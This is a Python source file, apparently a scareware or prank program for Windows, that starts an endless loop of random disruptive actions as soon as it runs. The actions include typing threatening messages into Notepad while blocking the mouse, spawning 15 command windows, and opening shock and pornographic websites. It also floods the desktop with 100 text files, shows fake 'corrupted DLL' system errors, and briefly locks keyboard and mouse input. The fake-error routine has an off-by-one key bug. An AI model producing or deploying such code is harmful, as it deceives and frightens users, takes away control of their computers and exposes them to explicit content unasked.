# sistema
import os
import pyautogui
import pynput

# nativas
from time import sleep
from random import randint
import getpass


nome_pc = getpass.getuser()


class Metodos:
    def __init__(self) -> None:
        pass

    def notepad():
        mouse = pynput.mouse.Listener(suppress=True)
        mouse.start()

        tup_frases = (
            "Seu historico tem muitas coisas",
            "Seu e-mail esta cheio de mensagens nao lidas.",
            "Interessante, voce passa muito tempo nesses sites.",
            "voce realmente precisa atualizar seu antivirus.",
            "sua senha pode ser mais forte",
            "tem certeza que voce esta sozinho?",
            "olhe para tras...",
            "voce tem medo da morte ?",
            "o diabo a quem ?",
            "coce nao pode escapar.")
        frases = randint(0, len(tup_frases) - 1)

        os.startfile("notepad.exe")
        sleep(1)

        for l in tup_frases[frases]:
            pyautogui.write(l)
            sleep(0.1)

        mouse.stop()

    def cmd():
        for c in range(0, 15):
            os.startfile("cmd.exe")
        pyautogui.write('ipconfig')
        pyautogui.press('enter')

    def pesquisa():
        import webbrowser

        try:
            tup_pesquisa = (
                "opentopia.com",
                "sobrenatural.org",
                "takethislollipop.com",
                "cryptomundo.com",
                "creepypastabrasil.com.br",
                "deathdate.info",
                "joyofsatan.org",
                "crazyshit.com",
                "xvideos.com",
                "https://pt.pornhub.com/",
                "Theync",
                "http://jimpunk.com/",
                "https://planecrashinfo.com/",
                "https://thisxdoesnotexist.com/")
            frases = randint(0, len(tup_pesquisa) - 1)

            webbrowser.open(tup_pesquisa[frases])
        except:
            pass

    def arquivos_texto():
        local = f"C:/Users/{nome_pc}/OneDrive/Área de Trabalho"

        for c in range(0, 100):
            arquivo_nome = f"Documento Imporante{c}.txt"
            file_path = os.path.join(local, arquivo_nome)

            with open(file_path, "w") as file:
                file.write("Você não pode fugir.")

    def error():
        import ctypes

        dll = {
            1: "Kernel32.dll",
            2: "User32.dll",
            3: "Gdi32.dll",
            4: "Advapi32.dll",
            5: "Comdlg32.dll"}

        MessageBox = ctypes.windll.user32.MessageBoxW
        MessageBox(None, f" Windows encontrou um erro em seu sistema. Arquivo corrompido: {dll[randint(0, len(dll)-1)]}","Erro", 0x10)

    def trava():
        mouse = pynput.mouse.Listener(suppress=True)
        teclado = pynput.keyboard.Listener(suppress=True)
        mouse.start()
        teclado.start()

        sleep(5)

        mouse.stop()
        teclado.stop()
        

    def iniciar():
        while True:
            tempo = randint(0, 10)
            sleep(tempo)

            lista = [Metodos.pesquisa,Metodos.cmd,Metodos.notepad,
                    Metodos.arquivos_texto,Metodos.trava, Metodos.error]
            funcao = lista[randint(0, len(lista) - 1)]
            funcao()


Metodos.iniciar()